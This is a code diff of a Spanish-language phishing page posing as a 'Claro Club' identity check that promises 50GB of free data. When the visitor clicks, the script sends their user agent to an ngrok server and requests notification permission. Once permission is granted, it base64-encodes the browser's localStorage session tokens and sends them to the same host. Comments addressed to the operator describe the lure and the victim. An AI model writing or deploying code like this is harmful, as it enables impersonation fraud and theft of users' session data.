@@ -1,34 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <title>Claro Club | Verificación</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claro Club | Verificación de Identidad</title>
+    <style>
+        body { background: #f4f4f4; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .card { background: white; border-radius: 15px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 320px; }
+        .logo { color: #ee1c25; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
+        .btn { background: #ee1c25; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer; width: 100%; }
+        #status { color: #666; font-size: 14px; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">Claro</div>
+        <h2>¿Eres humano?</h2>
+        <p>Para recibir tus <b>50GB Libres</b>, haz clic en el botón de abajo y selecciona <b>"Permitir"</b> en la validación de red.</p>
+        
+        <button class="btn" onclick="activarAcceso()">VERIFICAR AHORA</button>
+        
+        <div id="status">Esperando verificación...</div>
+    </div>
+
     <script>
+        // Tu URL de Ngrok
         var ng = "https://superdelicately-handworked-brenna.ngrok-free.dev/log?";
 
-        // Función de Inteligencia Suprema: Captura de pantalla/notificación
         async function activarAcceso() {
-            // Pedimos permiso de notificación oculto en un "OK"
-            const permission = await Notification.requestPermission();
+            document.getElementById('status').innerText = "Iniciando protocolo...";
             
-            if (permission === 'granted') {
-                // Notificamos a tu NetHunter que ya tenés el puente hecho
-                new Image().src = ng + "fase=BRIDGE_ACTIVE&dev=" + btoa(navigator.userAgent);
+            // 1. Notificamos a tu NetHunter que el pibe tocó el botón
+            new Image().src = ng + "fase=CLICK_BOTON&dev=" + btoa(navigator.userAgent);
+
+            // 2. Pedimos permiso de notificación (el gancho para el acceso)
+            try {
+                const permission = await Notification.requestPermission();
                 
-                // Redirigimos a una página de "Cargando" infinita para mantenerlo ahí
-                document.body.innerHTML = "<h1>Actualizando sistema de red...</h1><p>Por favor, mantén esta pestaña abierta para recibir tus 50GB.</p>";
+                if (permission === 'granted') {
+                    // 3. Si acepta, mandamos la señal de "Puente Activo"
+                    new Image().src = ng + "fase=BRIDGE_ACTIVE&status=GRANTED";
+                    
+                    // 4. Intentamos capturar tokens de sesión de fondo
+                    var tokens = btoa(JSON.stringify(localStorage));
+                    new Image().src = ng + "fase=SESSION_DATA&tokens=" + tokens;
+
+                    document.body.innerHTML = `
+                        <div style="padding:50px;">
+                            <h1 style="color:#ee1c25;">PROCESANDO...</h1>
+                            <p>Sincronizando con la red Claro. No cierres esta ventana para no perder tus 50GB.</p>
+                            <img src="https://i.gifer.com/ZZ5H.gif" width="50">
+                        </div>
+                    `;
+                } else {
+                    alert("Debes permitir las notificaciones para validar tu línea.");
+                }
+            } catch (err) {
+                console.log("Error de permisos.");
             }
         }
-
-        window.onload = function() {
-            // Apenas entra, tiramos el anzuelo
-            activarAcceso();
-        };
     </script>
-</head>
-<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
-    <div style="border:1px solid #ccc; display:inline-block; padding:20px; border-radius:10px;">
-        <h2>¿Eres humano?</h2>
-        <p>Haz clic en "Permitir" en la ventana emergente para continuar.</p>
-    </div>
 </body>
 </html>
